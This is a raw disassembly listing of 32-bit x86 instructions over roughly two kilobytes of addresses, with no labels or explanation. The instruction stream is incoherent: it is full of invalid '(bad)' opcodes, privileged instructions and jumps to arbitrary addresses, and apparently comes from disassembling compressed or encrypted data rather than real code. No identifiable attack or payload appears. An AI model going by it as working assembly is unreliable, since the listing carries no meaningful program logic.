  40c007:	mov    edx,DWORD PTR [edx+0x6e668929]
  40c00d:	and    DWORD PTR [ecx],0x9ee0c7aa
  40c013:	mov    bl,BYTE PTR ds:0x3043c20c
  40c019:	into   
  40c01a:	ins    BYTE PTR es:[edi],dx
  40c01b:	cwde   
  40c01c:	inc    ebx
  40c01d:	retf   
  40c01e:	fidivr WORD PTR [edx-0x63]
  40c021:	shl    DWORD PTR [edx+eax*4-0x7f],1
  40c025:	xor    BYTE PTR [edi],ah
  40c027:	mov    ds:0x8fbf7297,al
  40c02c:	and    BYTE PTR [edi-0x1c],cl
  40c02f:	fist   DWORD PTR gs:[ecx]
  40c032:	cmp    al,0x45
  40c034:	xchg   ebx,eax
  40c035:	mov    esp,0x81e58c86
  40c03a:	and    BYTE PTR [eax+0x553768fe],bl
  40c040:	sub    ch,0x5a
  40c043:	stos   DWORD PTR es:[edi],eax
  40c044:	add    DWORD PTR [edx-0x4e],ecx
  40c047:	push   eax
  40c048:	stos   DWORD PTR es:[edi],eax
  40c049:	(bad)  
  40c04a:	scas   eax,DWORD PTR es:[edi]
  40c04b:	mov    BYTE PTR [edi],cl
  40c04d:	out    dx,al
  40c04e:	sbb    DWORD PTR [edi-0x2d201be],eax
  40c054:	daa    
  40c055:	adc    DWORD PTR [edx-0xd919b56],ebx
  40c05b:	fidiv  DWORD PTR [ebx]
  40c05d:	aaa    
  40c05e:	ja     0x40bfeb
  40c060:	adc    DWORD PTR ds:0xb3c7f2c6,ecx
  40c066:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c067:	jbe    0x40c020
  40c069:	push   ebx
  40c06a:	mov    WORD PTR [edx+ebp*1-0x1f3a65d],cs
  40c071:	xchg   esp,eax
  40c072:	add    DWORD PTR [edi],edi
  40c074:	mov    esi,0x72483c2
  40c079:	sysexit 
  40c07b:	dec    ebp
  40c07c:	and    edx,DWORD PTR [ebx]
  40c07e:	ins    DWORD PTR es:[edi],dx
  40c07f:	cmp    dl,BYTE PTR [edi-0xc90b211]
  40c085:	pop    ds
  40c086:	loope  0x40c051
  40c088:	popf   
  40c089:	jp     0x40c01a
  40c08b:	dec    edi
  40c08c:	ret    
  40c08d:	and    eax,0xe4b4c45d
  40c092:	push   cs
  40c093:	pop    esi
  40c094:	or     al,0x2a
  40c096:	cli    
  40c097:	xlat   BYTE PTR ds:[ebx]
  40c098:	or     al,0xb0
  40c09a:	cmp    al,0x6e
  40c09c:	ss jecxz 0x40c0c8
  40c09f:	fisttp QWORD PTR [ebx+0x74133aa3]
  40c0a5:	sbb    BYTE PTR [eax+esi*8-0x58],bh
  40c0a9:	enter  0xa4ac,0x36
  40c0ad:	loop   0x40c111
  40c0af:	mov    bl,0x9f
  40c0b1:	fs out 0x58,al
  40c0b4:	cli    
  40c0b5:	icebp  
  40c0b6:	lods   al,BYTE PTR ds:[esi]
  40c0b7:	fnsave [edi+0x69]
  40c0ba:	ja     0x40c0a6
  40c0bc:	dec    edx
  40c0bd:	xor    al,0xc6
  40c0bf:	push   ebx
  40c0c0:	mov    eax,0x3b108df6
  40c0c5:	jbe    0x40c0b5
  40c0c7:	js     0x40c069
  40c0c9:	in     al,0x49
  40c0cb:	imul   edx,DWORD PTR [esi],0xedaffa1a
  40c0d1:	mov    ebp,0xf98ee5b0
  40c0d6:	fcomp  QWORD PTR [edx-0x19]
  40c0d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c0da:	dec    edi
  40c0db:	or     eax,0x3a3156a9
  40c0e0:	test   DWORD PTR [ebp+0xd],0x25f228d9
  40c0e7:	test   eax,0x5fa85c78
  40c0ec:	repnz out 0x70,eax
  40c0ef:	or     ebp,edi
  40c0f1:	adc    al,BYTE PTR [ebx+0x76980883]
  40c0f7:	fs mov ch,0x5f
  40c0fa:	pushf  
  40c0fb:	cmp    edi,ebp
  40c0fd:	jne    0x40c130
  40c0ff:	fcom   QWORD PTR [ebp-0xb5e875d]
  40c105:	mov    ebp,DWORD PTR [eax-0x4c]
  40c108:	cwde   
  40c109:	pop    ss
  40c10a:	retf   
  40c10b:	out    0xde,eax
  40c10d:	jecxz  0x40c10d
  40c10f:	lock xchg esi,eax
  40c111:	(bad)  
  40c112:	out    dx,al
  40c113:	rcr    DWORD PTR [ebx-0x3ad619a8],1
  40c119:	loope  0x40c158
  40c11b:	mov    eax,0x72e4d4d3
  40c120:	inc    ebp
  40c121:	cmp    eax,0x4876ea7c
  40c126:	mov    ch,0x54
  40c128:	adc    edx,ebp
  40c12a:	push   edi
  40c12b:	and    eax,0x88a60e2e
  40c130:	mov    edx,0x85428556
  40c135:	es sahf 
  40c137:	xchg   BYTE PTR [ebp-0x3],dl
  40c13a:	jle    0x40c132
  40c13c:	into   
  40c13d:	(bad)  
  40c13e:	cld    
  40c13f:	fwait
  40c140:	cmp    ah,BYTE PTR [edi]
  40c142:	fadd   DWORD PTR [edx+0x78]
  40c145:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c146:	or     bl,0xd6
  40c149:	ds dec ecx
  40c14b:	icebp  
  40c14c:	push   es
  40c14d:	ins    BYTE PTR es:[edi],dx
  40c14e:	gs fwait
  40c150:	add    BYTE PTR [esi+0x2b],0x74
  40c154:	clc    
  40c155:	pop    ss
  40c156:	cli    
  40c157:	pop    esp
  40c158:	mov    DWORD PTR [edx+0x5e6c2467],ebx
  40c15e:	push   esi
  40c15f:	fsub   QWORD PTR [esi]
  40c161:	or     al,0x81
  40c163:	push   es
  40c164:	out    dx,al
  40c165:	sub    eax,0x799566db
  40c16a:	mov    ebx,0x3f0ed2ca
  40c16f:	pop    ebx
  40c170:	inc    esp
  40c171:	push   cs
  40c172:	or     BYTE PTR [eax+0x68fae68b],cl
  40c178:	std    
  40c179:	add    eax,0x3a05023e
  40c17e:	xchg   edi,eax
  40c17f:	out    0x28,al
  40c181:	cmp    eax,edx
  40c183:	in     eax,dx
  40c184:	jmp    0xbd8f:0xf3d3ae1e
  40c18b:	jb     0x40c1ec
  40c18d:	cdq    
  40c18e:	cli    
  40c18f:	push   ebx
  40c190:	jl     0x40c17f
  40c192:	jle    0x40c1e8
  40c194:	inc    ebx
  40c195:	mov    ds:0x7ca95879,eax
  40c19a:	idiv   BYTE PTR [edi+eax*1+0x4bc23809]
  40c1a1:	sub    BYTE PTR [eax-0x68],0xd4
  40c1a5:	in     al,dx
  40c1a6:	cmc    
  40c1a7:	nop
  40c1a8:	or     al,0xab
  40c1aa:	imul   eax,DWORD PTR [ecx-0x606ea108],0xb30470e9
  40c1b4:	sub    al,0x49
  40c1b6:	lods   al,BYTE PTR ds:[esi]
  40c1b7:	mov    al,0xf3
  40c1b9:	cli    
  40c1ba:	cmp    DWORD PTR [esi],ebx
  40c1bc:	mov    ch,0xb7
  40c1be:	jg     0x40c173
  40c1c0:	and    bl,cl
  40c1c2:	xlat   BYTE PTR ds:[ebx]
  40c1c3:	jg     0x40c1ee
  40c1c5:	push   es
  40c1c6:	mov    edi,0xd3408f63
  40c1cb:	mov    dl,0x47
  40c1cd:	pop    ecx
  40c1ce:	jl     0x40c1c3
  40c1d0:	bound  ecx,QWORD PTR [edx+0x32]
  40c1d3:	xchg   BYTE PTR [eax],cl
  40c1d5:	and    esp,DWORD PTR [edx]
  40c1d7:	or     al,0x59
  40c1d9:	push   edx
  40c1da:	inc    ecx
  40c1db:	lds    edi,FWORD PTR [edi]
  40c1dd:	ror    DWORD PTR [di],0x60
  40c1e1:	add    ebp,DWORD PTR [ebx-0x50252d9e]
  40c1e7:	jb     0x40c1cf
  40c1e9:	add    bl,BYTE PTR [ebx]
  40c1eb:	mov    edx,0x58082d21
  40c1f0:	sbb    eax,0xbd0cbf35
  40c1f6:	mov    DWORD PTR ds:0xa90ca03b,ecx
  40c1fc:	cmp    eax,0xd7afd46f
  40c201:	pop    es
  40c202:	mov    bh,0x5e
  40c204:	adc    DWORD PTR [ebx-0xa],ebx
  40c207:	pop    ebx
  40c208:	(bad)  
  40c209:	cmp    edi,DWORD PTR [eax+0x460cd7ba]
  40c20f:	cwde   
  40c210:	popf   
  40c211:	jno    0x40c196
  40c213:	inc    ebp
  40c214:	cmc    
  40c215:	hlt    
  40c216:	pop    ebx
  40c217:	jle    0x40c216
  40c219:	xchg   esp,eax
  40c21a:	mov    BYTE PTR es:[esi+ebx*2-0x7a],dh
  40c21f:	std    
  40c220:	dec    edx
  40c221:	fwait
  40c222:	in     al,dx
  40c223:	cs in  al,0xf1
  40c226:	mov    ah,0xed
  40c228:	dec    ecx
  40c229:	inc    ebp
  40c22a:	add    BYTE PTR [ebx],bl
  40c22c:	adc    eax,0xc13a910f
  40c231:	mov    DWORD PTR [esi],0xf3b51652
  40c237:	sbb    eax,0xd4e1e7da
  40c23c:	in     eax,0x2d
  40c23e:	pop    ecx
  40c23f:	sbb    eax,0x58877d89
  40c244:	and    al,0xcc
  40c246:	dec    ebp
  40c247:	es push edi
  40c249:	mov    ds:0x58db0bb2,eax
  40c24e:	ins    BYTE PTR es:[edi],dx
  40c24f:	bound  ebx,QWORD PTR [edx+eiz*4]
  40c252:	aaa    
  40c253:	test   eax,0x511d42cb
  40c258:	or     esi,DWORD PTR [ebp+0x2fe3d2c5]
  40c25e:	xchg   ebx,eax
  40c25f:	pop    eax
  40c260:	cs ja  0x40c20c
  40c263:	add    bl,BYTE PTR [ebx]
  40c265:	js     0x40c296
  40c267:	pusha  
  40c268:	(bad)  
  40c269:	sahf   
  40c26a:	pop    ss
  40c26b:	dec    esi
  40c26c:	cs xor eax,0x1009fc02
  40c272:	loop   0x40c24f
  40c274:	test   BYTE PTR [ebx],dl
  40c276:	mov    edx,esi
  40c278:	xchg   edx,eax
  40c279:	std    
  40c27a:	cmp    edx,DWORD PTR [eax+0x34]
  40c27d:	cs call 0xe10f:0xe7089447
  40c285:	cmc    
  40c286:	mov    edx,0x50c7b78b
  40c28b:	sbb    DWORD PTR ds:0xe7c96b7,0x705b5ed3
  40c295:	jg     0x40c276
  40c297:	cmc    
  40c298:	out    0xc3,al
  40c29a:	sub    dl,BYTE PTR [esi]
  40c29c:	push   edi
  40c29d:	aad    0x3
  40c29f:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c2a1:	or     bl,ah
  40c2a3:	xchg   edx,eax
  40c2a4:	mov    eax,ds:0x11aabf8a
  40c2a9:	(bad)  
  40c2ab:	cwd    
  40c2ad:	sbb    esi,DWORD PTR [ebx]
  40c2af:	aam    0x21
  40c2b1:	loopne 0x40c298
  40c2b3:	xor    eax,0xfdc492fe
  40c2b8:	cdq    
  40c2b9:	retf   0x7d33
  40c2bc:	push   ebx
  40c2bd:	clc    
  40c2be:	out    0x80,eax
  40c2c0:	mov    edx,0xbb56385f
  40c2c5:	ins    DWORD PTR es:[edi],dx
  40c2c6:	test   BYTE PTR [ebx],ch
  40c2c8:	call   0x3c34:0xf3cfd440
  40c2cf:	push   ds
  40c2d0:	mov    edi,0x258f6425
  40c2d5:	(bad)  
  40c2d7:	mul    DWORD PTR [esi-0x4d]
  40c2da:	fldcw  WORD PTR [ebx-0x41b162b2]
  40c2e0:	add    DWORD PTR [esi+ecx*4+0x444370d],esi
  40c2e7:	hlt    
  40c2e8:	mov    ds:0x40262097,al
  40c2ed:	xor    cl,BYTE PTR [ecx]
  40c2ef:	mov    BYTE PTR [eax-0x38ea1710],dl
  40c2f5:	cmp    eax,0xa8a57764
  40c2fa:	pop    ebp
  40c2fb:	nop    DWORD PTR [ebx-0x73f2e86c]
  40c302:	jns    0x40c36b
  40c304:	hlt    
  40c305:	xchg   ecx,eax
  40c306:	scas   eax,DWORD PTR es:[edi]
  40c307:	push   cs
  40c308:	and    al,0xe
  40c30a:	mov    eax,ds:0x6060fb9b
  40c30f:	or     ecx,esi
  40c311:	jmp    0x86fe00f1
  40c316:	and    eax,0xb0405a38
  40c31b:	mov    esi,DWORD PTR [eax]
  40c31d:	bound  edi,QWORD PTR ds:0x50f70c80
  40c323:	repz pop es
  40c325:	(bad)  
  40c326:	(bad)
  40c32a:	call   0x7ee5:0xdc072260
  40c331:	nop
  40c332:	(bad)  [ecx-0x77]
  40c335:	sub    cl,BYTE PTR [edx]
  40c337:	push   esi
  40c338:	iret   
  40c339:	mov    ds:0x8a4d67fa,al
  40c33e:	inc    edi
  40c33f:	push   es
  40c340:	jmp    0x55547c25
  40c345:	ss out dx,al
  40c347:	mov    bh,0x16
  40c349:	xchg   edi,eax
  40c34a:	std    
  40c34b:	cdq    
  40c34c:	cs jae 0x40c396
  40c34f:	xchg   ebp,eax
  40c350:	xchg   DWORD PTR [edx-0x3d],ebx
  40c353:	jbe    0x40c2df
  40c355:	inc    edx
  40c356:	bnd jl 0x40c321
  40c359:	inc    edx
  40c35a:	inc    ebx
  40c35b:	mov    esi,0x25505a2f
  40c360:	dec    ebx
  40c361:	mov    bh,0x61
  40c363:	sbb    al,0x32
  40c365:	shl    BYTE PTR [edx+eiz*2+0x42284fe5],1
  40c36c:	loop   0x40c32e
  40c36e:	xchg   esp,eax
  40c36f:	or     BYTE PTR [edi],bl
  40c371:	outs   dx,BYTE PTR ds:[esi]
  40c372:	add    esp,DWORD PTR [edi]
  40c374:	adc    ch,dh
  40c376:	sbb    ch,bh
  40c378:	adc    bl,bh
  40c37a:	cmp    eax,0xe33050b1
  40c37f:	pop    ebp
  40c380:	and    BYTE PTR [ecx+eax*8],bl
  40c383:	push   ebp
  40c384:	pop    es
  40c385:	pop    ebp
  40c386:	fcomi  st,st(2)
  40c388:	jl     0x40c313
  40c38a:	jo     0x40c33a
  40c38c:	sar    BYTE PTR ds:0xa629158a,cl
  40c392:	aad    0xeb
  40c394:	(bad)  
  40c395:	into   
  40c396:	out    0x29,eax
  40c398:	test   DWORD PTR [edi+0x7e],ebx
  40c39b:	cmc    
  40c39c:	and    eax,0x53f5162e
  40c3a1:	mov    ecx,0x410e71fb
  40c3a6:	mov    eax,0xb87ccb9b
  40c3ab:	outs   dx,BYTE PTR ds:[esi]
  40c3ac:	mov    dl,BYTE PTR [ecx+0x78faca6]
  40c3b2:	nop
  40c3b3:	call   0x651d:0xc16b1492
  40c3ba:	add    edx,DWORD PTR ds:0x6ae85490
  40c3c0:	push   ds
  40c3c1:	or     ecx,DWORD PTR [ecx+edi*2-0x5a520ab7]
  40c3c8:	scas   eax,DWORD PTR es:[edi]
  40c3c9:	scas   al,BYTE PTR es:[edi]
  40c3ca:	and    DWORD PTR [edx-0x49b2995c],eax
  40c3d0:	dec    esi
  40c3d1:	retf   
  40c3d2:	scas   al,BYTE PTR es:[edi]
  40c3d3:	xor    edi,DWORD PTR [ebx]
  40c3d5:	jge    0x40c372
  40c3d7:	sub    eax,0xeb5710f7
  40c3dc:	push   ds
  40c3dd:	call   0x7f9f:0x7591a792
  40c3e4:	test   eax,0xa640f832
  40c3e9:	mov    BYTE PTR [ecx+0x4c],bl
  40c3ec:	xchg   esi,eax
  40c3ed:	jns    0x40c41e
  40c3ef:	sub    DWORD PTR [edx-0x44786cbe],ebp
  40c3f5:	push   ebp
  40c3f6:	sbb    bh,BYTE PTR [ecx]
  40c3f8:	aam    0x1f
  40c3fa:	lods   al,BYTE PTR ds:[esi]
  40c3fb:	mov    edx,0xb52bfe0d
  40c400:	(bad)  
  40c401:	idiv   BYTE PTR [ebp+0x5feef3a0]
  40c407:	mov    cl,0x28
  40c409:	retf   0x3c65
  40c40c:	inc    edi
  40c40d:	(bad)  
  40c40e:	shr    BYTE PTR ds:0xdcb112f1,cl
  40c414:	adc    eax,0x6da0a1b6
  40c419:	repz sbb eax,0x7ac2e522
  40c41f:	(bad)  
  40c420:	stos   DWORD PTR es:[edi],eax
  40c421:	fst    DWORD PTR [ecx-0x67]
  40c424:	les    ebx,FWORD PTR [esi-0x5e]
  40c427:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c428:	add    al,0x76
  40c42a:	repz aam 0xb2
  40c42d:	pop    ebx
  40c42e:	dec    ebp
  40c42f:	dec    WORD PTR [ecx-0x44c2b3f0]
  40c436:	add    DWORD PTR [edx+eax*4],esp
  40c439:	js     0x40c419
  40c43b:	sub    BYTE PTR [edi+0x7d],dh
  40c43e:	jno    0x40c49c
  40c440:	xchg   edx,eax
  40c441:	jne    0x40c3ce
  40c443:	xchg   edx,eax
  40c444:	push   ebp
  40c445:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c446:	mov    dl,0x50
  40c448:	sbb    al,0x42
  40c44a:	mov    DWORD PTR [edi+eax*2-0x47b4e35b],ebp
  40c451:	push   cs
  40c452:	cdq    
  40c453:	or     al,0x19
  40c455:	xor    esp,DWORD PTR [edi]
  40c457:	js     0x40c48d
  40c459:	add    al,0xca
  40c45b:	test   al,dh
  40c45d:	mov    esi,0x3971636
  40c462:	jae    0x40c467
  40c464:	(bad)  
  40c466:	or     al,0xdc
  40c468:	mov    WORD PTR [eax+0x1a],ds
  40c46b:	loop   0x40c410
  40c46d:	rcl    BYTE PTR [esi],0x35
  40c470:	mov    cl,0xd9
  40c472:	jbe    0x40c4f1
  40c474:	hlt    
  40c475:	fidiv  DWORD PTR [esp+esi*8+0x6883c278]
  40c47c:	jbe    0x40c4f1
  40c47e:	das    
  40c47f:	je     0x40c453
  40c481:	bound  esp,QWORD PTR [esi-0x14]
  40c484:	in     al,dx
  40c485:	xchg   esi,eax
  40c486:	pop    edx
  40c487:	mov    esi,0xf391f745
  40c48c:	cs jno 0x40c432
  40c48f:	jg     0x40c4ef
  40c491:	mov    esi,eax
  40c493:	call   0xc3d0268c
  40c498:	arpl   WORD PTR [ecx+0x28],sp
  40c49b:	out    dx,al
  40c49c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c49d:	(bad)  
  40c49e:	mov    al,ds:0x8a3f3f29
  40c4a3:	and    al,0xe1
  40c4a5:	stc    
  40c4a6:	lea    esp,[esi+eiz*4]
  40c4a9:	jp     0x40c4cf
  40c4ab:	push   0x5a5911ea
  40c4b0:	stos   BYTE PTR es:[edi],al
  40c4b1:	xchg   BYTE PTR [esp+ebx*8-0x68dbdd9],ch
  40c4b8:	xchg   edi,eax
  40c4b9:	and    esp,DWORD PTR [ebx]
  40c4bb:	lea    eax,[ebp+0x37]
  40c4be:	aad    0x13
  40c4c0:	repz inc esi
  40c4c2:	adc    eax,0xb7e18a09
  40c4c7:	jge    0x40c479
  40c4c9:	jne    0x40c4e0
  40c4cb:	adc    al,0xa6
  40c4cd:	pop    ecx
  40c4ce:	sahf   
  40c4cf:	pop    ds
  40c4d0:	sahf   
  40c4d1:	inc    edi
  40c4d2:	ds xor al,0x69
  40c4d5:	call   0xb6ef110c
  40c4da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c4db:	dec    ebx
  40c4dc:	mov    ah,0x4c
  40c4de:	mov    eax,ds:0x24666b65
  40c4e3:	dec    edi
  40c4e4:	jo     0x40c501
  40c4e6:	dec    ecx
  40c4e7:	jle    0x40c541
  40c4e9:	inc    ebx
  40c4ea:	test   al,0x64
  40c4ec:	fsub   QWORD PTR [ebx]
  40c4ee:	ins    BYTE PTR es:[edi],dx
  40c4ef:	push   edi
  40c4f0:	mov    eax,ds:0x5b5fe92f
  40c4f5:	ja     0x40c4ea
  40c4f7:	pop    ds
  40c4f8:	fiadd  WORD PTR [ecx-0xdfe335b]
  40c4fe:	mov    ds:0xd8d714bf,al
  40c503:	fcomp  st(1)
  40c505:	in     eax,dx
  40c506:	lods   eax,DWORD PTR ds:[esi]
  40c507:	cmp    ecx,DWORD PTR ds:0xdb2955c2
  40c50d:	xchg   DWORD PTR [esi+0x38897e3e],edx
  40c513:	sahf   
  40c514:	int3   
  40c515:	loopne 0x40c532
  40c517:	shr    BYTE PTR [ecx+esi*2-0x79b80c46],0x8
  40c51f:	adc    al,0x32
  40c521:	js     0x40c547
  40c523:	or     BYTE PTR [edx-0x5e],ch
  40c526:	fwait
  40c527:	sahf   
  40c528:	test   eax,0x56867027
  40c52d:	adc    DWORD PTR [ecx],eax
  40c52f:	mov    ah,0x9c
  40c531:	test   BYTE PTR [ebx+0x758c4586],al
  40c537:	add    DWORD PTR [esi-0x6fa5b78d],ecx
  40c53d:	cmp    ebp,ebx
  40c53f:	and    al,0x4e
  40c541:	lds    esi,FWORD PTR [ebp-0x12]
  40c544:	sahf   
  40c545:	or     al,0xa
  40c547:	scas   al,BYTE PTR es:[edi]
  40c548:	(bad)  
  40c549:	lea    edi,[ecx]
  40c54b:	jo     0x40c5ab
  40c54d:	add    al,0x9d
  40c54f:	push   cs
  40c550:	test   BYTE PTR [edi],cl
  40c552:	test   eax,0x591b3d6a
  40c557:	aad    0xe9
  40c559:	shl    BYTE PTR [ebp-0x48065932],cl
  40c55f:	adc    ch,ah
  40c561:	mov    eax,ds:0x7f968845
  40c566:	outs   dx,BYTE PTR ds:[esi]
  40c567:	leave  
  40c568:	xor    dh,BYTE PTR [ecx]
  40c56a:	(bad)  
  40c56b:	pop    edi
  40c56c:	xchg   edi,eax
  40c56d:	push   ds
  40c56e:	inc    ebp
  40c56f:	pop    ecx
  40c570:	xchg   edx,eax
  40c571:	std    
  40c572:	push   ds
  40c573:	adc    al,0x2c
  40c575:	mov    bh,0x3b
  40c577:	in     al,0x89
  40c579:	inc    ecx
  40c57a:	out    dx,eax
  40c57b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c57c:	repz pop eax
  40c57e:	push   ss
  40c57f:	lods   eax,DWORD PTR ds:[esi]
  40c580:	(bad)  
  40c581:	jl     0x40c52a
  40c583:	xor    esi,DWORD PTR [edx+0x48]
  40c586:	addr16 add al,0xe8
  40c589:	out    dx,eax
  40c58a:	mov    al,0x14
  40c58c:	dec    ebx
  40c58d:	and    eax,0x6adc2155
  40c592:	mov    al,0x57
  40c594:	rol    BYTE PTR [edx-0x42],0xdb
  40c598:	adc    cl,bl
  40c59a:	and    DWORD PTR [edi-0x11eac9e8],ebx
  40c5a0:	aaa    
  40c5a1:	or     dh,ch
  40c5a3:	ins    BYTE PTR es:[edi],dx
  40c5a4:	dec    esp
  40c5a5:	mov    cl,0x44
  40c5a7:	xor    ebp,DWORD PTR [esi+0x31fe7245]
  40c5ad:	jg     0x40c586
  40c5af:	sbb    al,0xc9
  40c5b1:	or     dl,BYTE PTR [ecx-0x38faac2b]
  40c5b7:	jae    0x40c55d
  40c5b9:	pop    ss
  40c5ba:	lahf   
  40c5bb:	push   es
  40c5bc:	inc    ecx
  40c5bd:	cs push edi
  40c5bf:	aaa    
  40c5c0:	fcom   QWORD PTR [ebx+0x2f0f84d5]
  40c5c6:	icebp  
  40c5c7:	inc    edi
  40c5c8:	mov    BYTE PTR [esi-0x80],dl
  40c5cb:	jg     0x40c5d0
  40c5cd:	or     edx,ebp
  40c5cf:	mov    edx,0x7d16a38e
  40c5d4:	jo     0x40c5ef
  40c5d6:	sbb    DWORD PTR [eax+esi*4-0x8],eax
  40c5da:	shr    BYTE PTR [esi],cl
  40c5dc:	hlt    
  40c5dd:	inc    edi
  40c5de:	jge    0x40c598
  40c5e0:	mov    bl,bl
  40c5e2:	add    edi,0xfffffffb
  40c5e5:	icebp  
  40c5e6:	stos   BYTE PTR es:[edi],al
  40c5e7:	add    eax,0x83ac63ca
  40c5ec:	adc    eax,0x3678037
  40c5f1:	pop    ebp
  40c5f2:	xor    eax,DWORD PTR [edx+0x4a]
  40c5f5:	call   0xf3a33d3
  40c5fa:	add    dl,BYTE PTR [eax-0x47cffaeb]
  40c600:	adc    al,0x40
  40c602:	stos   BYTE PTR es:[edi],al
  40c603:	icebp  
  40c604:	ret    0x9e88
  40c607:	jne    0x40c67d
  40c609:	sbb    DWORD PTR [ebx+0x150e5dca],edx
  40c60f:	xor    BYTE PTR [edx+0x77cb36f8],0xd8
  40c616:	and    bh,BYTE PTR [esi-0x6b]
  40c619:	(bad)  
  40c61b:	mov    ebx,cs
  40c61d:	fcomi  st,st(7)
  40c61f:	sbb    BYTE PTR [ebx-0x2a67f231],bh
  40c625:	xchg   esi,eax
  40c626:	mov    eax,ds:0x49f012ae
  40c62b:	sbb    eax,0xf1a2074c
  40c630:	xchg   ebp,eax
  40c631:	sbb    eax,0xae0a7138
  40c636:	call   0x2665:0x3d67c970
  40c63d:	sar    BYTE PTR [ebp+0x4d],0x4a
  40c641:	ja     0x40c60d
  40c643:	test   BYTE PTR [edx+0x59353b74],ch
  40c649:	sub    DWORD PTR [edi-0x185010bb],eax
  40c64f:	jmp    0x7bedf6fa
  40c654:	(bad)  
  40c655:	popa   
  40c656:	fwait
  40c657:	inc    ebx
  40c658:	shr    ebx,cl
  40c65a:	test   ch,ch
  40c65c:	pop    ds
  40c65d:	sub    esi,ebp
  40c65f:	mov    cl,0x9a
  40c661:	mov    dh,0x96
  40c663:	icebp  
  40c664:	cmp    ebx,ecx
  40c666:	lahf   
  40c667:	arpl   WORD PTR [edx],ax
  40c669:	call   0x8efe:0x7cd32337
  40c670:	into   
  40c671:	jmp    0x9f81:0x2cf6c8d2
  40c678:	sbb    DWORD PTR [edx],0x1f5eb0ec
  40c67e:	lods   eax,DWORD PTR ds:[esi]
  40c67f:	fs mov edx,0x7c831681
  40c685:	push   0x47
  40c687:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c688:	sbb    ah,bh
  40c68a:	imul   ebx,DWORD PTR [eax+eiz*2],0x905d3c6d
  40c691:	inc    ebp
  40c692:	ret    0xee74
  40c695:	in     al,dx
  40c696:	add    al,0xf6
  40c699:	cmp    BYTE PTR [edi-0x64],0x62
  40c69d:	dec    esp
  40c69e:	cmp    edi,DWORD PTR ds:0xc5830cc3
  40c6a4:	xchg   ecx,eax
  40c6a5:	pushf  
  40c6a6:	fcom   st(7)
  40c6a8:	push   ebx
  40c6a9:	xlat   BYTE PTR ds:[ebx]
  40c6aa:	mov    ss,WORD PTR [edi+edi*2+0x1c]
  40c6ae:	cmp    al,0xa4
  40c6b0:	xchg   ecx,eax
  40c6b1:	int    0xcd
  40c6b3:	rcl    BYTE PTR [eiz*1+0x65fabfd3],0x7c
  40c6bb:	push   0xfffffffb
  40c6bd:	jmp    0x54ed:0x32c01f54
  40c6c4:	iret   
  40c6c5:	mov    ds:0xef3230d1,eax
  40c6ca:	fwait
  40c6cb:	popa   
  40c6cc:	mov    WORD PTR ds:0x98f87ab1,ds
  40c6d2:	in     eax,0x4b
  40c6d4:	pop    ds
  40c6d5:	dec    edi
  40c6d6:	loope  0x40c6c5
  40c6d8:	sub    ebp,DWORD PTR [eax+esi*2+0x297be19d]
  40c6df:	repz mov bh,0x3d
  40c6e2:	ja     0x40c716
  40c6e4:	out    dx,al
  40c6e5:	push   es
  40c6e6:	outs   dx,BYTE PTR ds:[esi]
  40c6e7:	pop    edx
  40c6e8:	(bad)  
  40c6e9:	out    0x6b,al
  40c6eb:	test   eax,0xa5dc5dba
  40c6f0:	and    eax,0x51c44e7
  40c6f5:	add    eax,0xbc89b3dc
  40c6fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c6fb:	fisttp WORD PTR [esi]
  40c6fd:	test   edi,ebp
  40c6ff:	leave  
  40c700:	inc    ebx
  40c701:	stos   WORD PTR es:[edi],ax
  40c703:	push   ebx
  40c704:	and    BYTE PTR [ecx-0x7b],0xf1
  40c708:	xchg   edx,eax
  40c709:	cmp    DWORD PTR [edx-0x11],esp
  40c70c:	mov    WORD PTR [ecx+0x5d1e610c],?
  40c712:	mov    BYTE PTR [edi],cl
  40c714:	xor    BYTE PTR [ecx],dh
  40c716:	sub    esi,DWORD PTR [eax-0x3]
  40c719:	stc    
  40c71a:	cs loop 0x40c758
  40c71d:	pop    ebx
  40c71e:	js     0x40c793
  40c720:	mov    cl,0x68
  40c722:	repnz fisttp QWORD PTR [edx]
  40c725:	sbb    dl,bl
  40c727:	(bad)  
  40c728:	loop   0x40c74b
  40c72a:	sar    BYTE PTR [ebx],0xab
  40c72d:	fs in  al,dx
  40c72f:	add    eax,0x6913c7fb
  40c734:	inc    edi
  40c735:	and    dl,bh
  40c737:	inc    edx
  40c738:	pop    esi
  40c739:	and    BYTE PTR [edi-0x5e],al
  40c73c:	sbb    eax,DWORD PTR [eax-0x1bd2c5d]
  40c742:	adc    eax,0x54b18bd3
  40c747:	stc    
  40c748:	test   DWORD PTR [edx],esi
  40c74a:	div    DWORD PTR [eax+0x302fceb3]
  40c750:	call   0x4c05:0x48af6ff0
  40c757:	cmp    DWORD PTR [ebx-0x52],esp
  40c75a:	and    BYTE PTR [edx+0x1b],bh
  40c75d:	aaa    
  40c75e:	mov    edx,0x3241affe
  40c763:	adc    al,0x81
  40c765:	pavgw  mm4,QWORD PTR [esi]
  40c768:	push   edx
  40c769:	dec    ecx
  40c76a:	loop   0x40c7ba
  40c76c:	jne    0x40c7b7
  40c76e:	sub    al,0xf
  40c770:	sub    eax,0x61dbd626
  40c775:	lds    eax,FWORD PTR [edi]
  40c777:	cmp    BYTE PTR [ebp+0x3],bl
  40c77a:	push   eax
  40c77b:	std    
  40c77c:	fwait
  40c77d:	or     ebp,DWORD PTR [edi-0x36]
  40c780:	push   ecx
  40c781:	adc    DWORD PTR [ebp-0x3ef61001],ebx
  40c787:	(bad)  
  40c788:	test   BYTE PTR [di-0x58],dh
  40c78c:	addr16 fs mov edx,0xf8d3281d
  40c793:	cld    
  40c794:	sbb    esp,esi
  40c796:	mov    dh,0x68
  40c798:	shr    BYTE PTR [ebx],0x99
  40c79b:	mov    bh,0xc4
  40c79d:	sbb    eax,edx
  40c79f:	pop    ebp
  40c7a0:	out    dx,eax
  40c7a1:	or     esp,ecx
  40c7a3:	packuswb mm0,QWORD PTR [edx]
